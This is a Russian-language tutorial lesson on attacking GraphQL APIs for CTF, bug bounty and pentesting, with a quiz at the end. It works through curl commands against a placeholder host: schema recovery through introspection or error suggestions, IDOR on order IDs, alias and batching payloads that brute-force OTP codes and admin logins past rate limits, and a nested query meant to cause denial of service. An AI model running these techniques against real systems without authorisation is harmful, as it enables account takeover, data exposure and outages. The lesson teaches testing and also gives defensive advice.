---
id: web-graphql-deep
title: "GraphQL deep: introspection off, batching, aliasing, DoS, authz"
category: web
parent: web-api-rest-graphql-soap
difficulty: hard
order: 2
tags: [graphql, introspection, batching, aliasing, idor, dos]
prerequisites: [web-api-rest-graphql-soap]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 42
summary: "Продвинутый GraphQL: обход отключённой introspection, batching/aliasing для обхода rate-limit и authz, depth-DoS и IDOR."
---

## Вопрос, с которого всё начинается

В REST ты тестируешь десятки эндпоинтов, и каждый — отдельная ручка. В GraphQL эндпоинт **один** — `/graphql` — а запрос формирует клиент. Значит, и ломать его нужно иначе.

Вопрос этого урока: если вся поверхность собрана в одну точку, где именно искать дыры? Оказывается — в схеме (её можно вытащить даже когда она «спрятана»), в авторизации на отдельных полях и в хитростях самого языка запросов, которые обходят лимиты. Разберём по порядку на одном API.

## Наш пример: один эндпоинт

Есть `api.example/graphql`. Первым делом убеждаемся, что это действительно GraphQL:

```bash
$ curl -s -X POST https://api.example/graphql -H 'Content-Type: application/json' \
>   -d '{"query":"{__typename}"}'
{"data":{"__typename":"Query"}}
```

Ответ `{"data":{"__typename":"Query"}}` — характерный признак: сервер понимает GraphQL-запрос. `__typename` — встроенное поле, которое возвращает имя типа; оно есть всегда.

## Шаг 1: интроспекция — карта схемы

GraphQL **самодокументируемый**: у него есть специальный запрос `__schema`, отдающий все типы и поля. Это как `openapi.json`, только встроенный в язык:

```bash
$ curl -s https://api.example/graphql -H 'Content-Type: application/json' \
>   -d '{"query":"{__schema{queryType{fields{name}}}}"}' | jq -r '.data.__schema.queryType.fields[].name'
me
order
user
node
```

Мы видим поля верхнего уровня: `me`, `order`, `user`, `node`. Последнее особенно интересно — `node(id:)` это типовой способ получить любой объект по глобальному ID. Интроспекция часто доступна прямо в проде, хотя её следовало бы выключать.

## Шаг 2: если интроспекция выключена

Если `__schema` отключён, схему всё равно восстанавливают — через **подсказки в ошибках**. GraphQL по умолчанию подсказывает похожие имена полей:

```bash
$ curl -s https://api.example/graphql -H 'Content-Type: application/json' \
>   -d '{"query":"{ userr { id } }"}'
{"errors":[{"message":"Cannot query field \"userr\" on type \"Query\". Did you mean \"user\", \"users\"?"}]}
```

Отправляя «почти правильные» запросы, ты вытаскиваешь имена полей одно за другим. Этот процесс автоматизирует `clairvoyance` — он сам перебирает подсказки и собирает схему:

```bash
$ clairvoyance https://api.example/graphql -o schema.json -w wordlist.txt -H 'Authorization: Bearer <token>'
[+] Retrieved 84 fields
```

## Шаг 3: IDOR на узлах и связях

Теперь главное: GraphQL возвращает **графы**, и авторизацию часто проверяют на верхнем уровне, забывая про вложенные поля. Запрашиваем свой заказ:

```bash
$ curl -s https://api.example/graphql -H 'Content-Type: application/json' \
>   -H "Authorization: Bearer $TOKEN" \
>   -d '{"query":"{ order(id:1001){ id total owner{ email } } }"}'
{"data":{"order":{"id":1001,"total":42,"owner":{"email":"me@x"}}}}
```

Меняем ID на соседний:

```bash
$ curl -s ... -d '{"query":"{ order(id:1002){ id total owner{ email } } }"}'
{"data":{"order":{"id":1002,"total":9000,"owner":{"email":"victim@corp.com"}}}}
```

Чужой заказ — это BOLA. Но GraphQL даёт ещё один путь: даже если `order` проверяет доступ, вложенное поле `owner` может **не** проверять — и тогда достаточно запросить свой заказ и «дотянуться» через связь до чужого пользователя.

## Шаг 4: aliasing и batching — обход лимитов

Это свойство самого языка. **Alias** позволяет запросить одно и то же поле под разными именами в одном запросе. Приложение, которое ограничивает число попыток ввода OTP **на HTTP-запрос**, обходится за один вызов:

```bash
$ curl -s https://api.example/graphql -H 'Content-Type: application/json' -d '{
>   "query":"mutation{
>     a1: verifyOtp(code:\"0001\")
>     a2: verifyOtp(code:\"0002\")
>     a3: verifyOtp(code:\"0003\")
>     a4: verifyOtp(code:\"0004\")
>   }"}'
{"data":{"a1":false,"a2":false,"a3":true,"a4":false}}
```

Четыре попытки — один HTTP-запрос. Код `0003` подошёл. Ещё мощнее **batching** — массив запросов в одном теле:

```json
[{"query":"mutation{login(user:\"admin\",pass:\"1\"){token}}"},
 {"query":"mutation{login(user:\"admin\",pass:\"2\"){token}}"}]
```

Так брутят пароли и купоны в обход rate-limit. Защита — лимит **операций** на запрос, а не HTTP-запросов.

## Шаг 5: DoS через вложенность (осторожно)

GraphQL разрешает вложенные связи, и без ограничения глубины один запрос может вызвать лавину вычислений:

```graphql
{ user { friends { friends { friends { friends { id } } } } } }
```

Экспоненциальный рост — это **DoS**. Тестировать такое на проде опасно: сначала проверь, есть ли depth/complexity limit (обычно сервер отклоняет слишком глубокий запрос с ошибкой), и только потом, с разрешения, оценивай нагрузку.

## Шаг 6: CSRF и подписки

Два неочевидных вектора. Первый — **CSRF**: если сервер принимает запрос через `GET` или `application/x-www-form-urlencoded`, защита на кастомном заголовке пропадает:

```bash
$ curl -s 'https://api.example/graphql?query={me{email}}'
```

Второй — **подписки** (subscriptions) по WebSocket: авторизация часто проверяется на HTTP-слое, а на WS-слое — нет, и можно подписаться на чужие события.

## Если не сработало

- `__schema` выключен и подсказки тоже — ищи запросы в JS-бандле клиента (`katana -jc`) или в мобильном приложении.
- IDOR на `order` закрыт — проверь связи (`owner`, `members`, `files`) и **мутации** (`updateUser`, `deleteOrder`), которые часто менее защищены.
- Aliasing не работает — возможно, сервер ограничивает число операций; попробуй batching-массив и `GET` с `?query=`.
- Introspection вернул ошибку авторизации — попробуй с обычным токеном и без него: иногда она отключена только для анонимов.

## Инструменты и persisted queries

Для каждого этапа есть свой инструмент:

| Инструмент | Назначение | Ключевые флаги |
|-----------|-----------|----------------|
| `graphql-cop` | аудит безопасности | `-t URL` |
| `clairvoyance` | восстановление схемы | `-o`, `-w`, `-H` |
| `InQL` (Burp) | работа со схемой, генерация запросов | расширение |
| `websocat` | подписки по WebSocket | `-H` |
| `nuclei` | шаблоны GraphQL | `-tags graphql` |

Отдельная тема — **persisted queries**: продакшн-API иногда принимают не текст запроса, а хеш заранее зарегистрированного. Задумано как защита, но часто настроено так, что сервер всё равно принимает произвольный запрос. Проверяй оба режима — `GET` с `?query=` и `POST` с телом:

```bash
$ curl -s 'https://api.example/graphql?query={__typename}'
{"data":{"__typename":"Query"}}
```

Если такой запрос проходит, allowlist на клиенте ничего не значит.

## Что мы теперь знаем

- GraphQL — один эндпоинт, где клиент сам задаёт форму запроса.
- Интроспекция (`__schema`) отдаёт всю схему; при её отключении схему восстанавливают по подсказкам (`clairvoyance`).
- Авторизацию нужно проверять на **каждом** поле и связи, а не на корне.
- Alias/batching позволяют много операций за один HTTP-запрос — обход rate-limit.
- Глубокая вложенность без depth-limit — это DoS.
- `GET`/form-urlencoded открывают CSRF; подписки по WebSocket часто без авторизации.

## На что смотреть дальше

- Не считай GraphQL «слишком сложным» — это одна точка входа, а не сотня.
- Не сдавайся без интроспекции: схема восстанавливается через suggestions.
- Не тестируй authz только на корне — дыра обычно во вложенных резолверах.
- Не забывай про aliasing/batching при бруте 2FA и логинов.
- DoS-запросы отправляй только с разрешения — можно уронить прод.

## Квиз

Проверь себя.

```quiz
- question: "Что такое introspection в GraphQL?"
  options:
    - "Кеш ответов"
    - "Запрос схемы (__schema) с типами и полями"
    - "Шифрование трафика"
    - "Логирование запросов"
  answer: 1
  explanation: "Позволяет получить всю схему API."
- question: "Как восстановить схему при выключенной introspection?"
  options:
    - "Никак"
    - "Через field suggestions («Did you mean ...») и clairvoyance"
    - "Через SQL-инъекцию"
    - "Через DNS"
  answer: 1
  explanation: "Ошибки валидации раскрывают имена полей."
- question: "Зачем при атаке нужны aliases?"
  options:
    - "Для красоты запроса"
    - "Выполнить много операций в одном запросе, обходя rate-limit"
    - "Для TLS"
    - "Для cookie"
  answer: 1
  explanation: "Aliases amplification — много попыток за один HTTP-запрос."
- question: "Как GraphQL batching помогает брутфорсу?"
  options:
    - "Ускоряет сеть"
    - "Позволяет несколько операций в одном HTTP-запросе"
    - "Меняет алгоритм подписи"
    - "Шифрует тело"
  answer: 1
  explanation: "Массив запросов выполняется за один вызов."
- question: "Чем опасны глубокие вложенные запросы?"
  options:
    - "Они длинные"
    - "Экспоненциальная нагрузка → DoS"
    - "Они шифруются"
    - "Они кешируются"
  answer: 1
  explanation: "Без depth-limit сервер можно уронить."
```

## Куда дальше

В следующем уроке мы посмотрим на **gRPC** (`web-grpc`) — ещё один бинарный протокол для API, где запросы не читаются глазами, и разберём, как его инспектировать и тестировать. А пока главное запомни: у GraphQL одна дверь, но за ней — вся схема, и ломается она на авторизации полей и на хитростях языка запросов.

## Где пригодится

- **CTF (Web):** GraphQL-задачи (интроспекция, IDOR, batching).
- **Bug bounty:** aliasing/IDOR/introspection — частые отчёты.
- **Пентест:** аудит GraphQL-API.
- **Работа (AppSec):** depth/complexity limits, field-level authz, отключение introspection и suggestions.
